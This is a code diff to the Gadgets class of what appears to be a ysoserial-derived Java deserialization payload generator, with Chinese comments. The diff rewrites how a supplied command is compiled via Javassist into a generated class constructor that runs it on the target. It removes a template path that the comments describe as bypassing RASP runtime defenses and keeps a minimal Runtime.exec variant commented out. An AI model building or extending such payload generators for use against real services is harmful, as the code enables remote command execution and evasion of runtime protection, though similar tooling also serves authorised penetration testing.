@@ -170,25 +170,17 @@ public class Gadgets {
 
 		// 如果 Command 不为空，则是普通的命令执行
 		if (command != null) {
-			if (!IS_OBSCURE) {
-				ctClass = pool.makeClass(newClassName);
-				// 创建无参构造方法
-				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-				ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
-				ctClass.addConstructor(ctConstructor);
+			ctClass = pool.makeClass(newClassName);
+			insertCMD(ctClass);
+			CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+			ctConstructor.setBody("{execCmd(\"" + command + "\");}");
+			ctClass.addConstructor(ctConstructor);
 
-				// 如果没有指定，则默认使用带有绕过 RASP 功能的 CommandTemplate 进行执行
-			} else {
-				// 修改类名
-				ctClass = pool.get("org.su18.ysuserial.payloads.templates.CommandTemplate");
-
-				// 由于使用了 Thread 修改内部类
-				ctClass.setName(newClassName);
-				// 修改字段
-				String cmd = "cmd = \"" + command + "\";";
-				ctClass.makeClassInitializer().insertBefore(cmd);
-
-			}
+			// 最短化
+//			ctClass = pool.makeClass(newClassName);
+//			CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+//			ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
+//			ctClass.addConstructor(ctConstructor);
 
 			// 如果全局配置继承，再设置父类
 			if (IS_INHERIT_ABSTRACT_TRANSLET) {
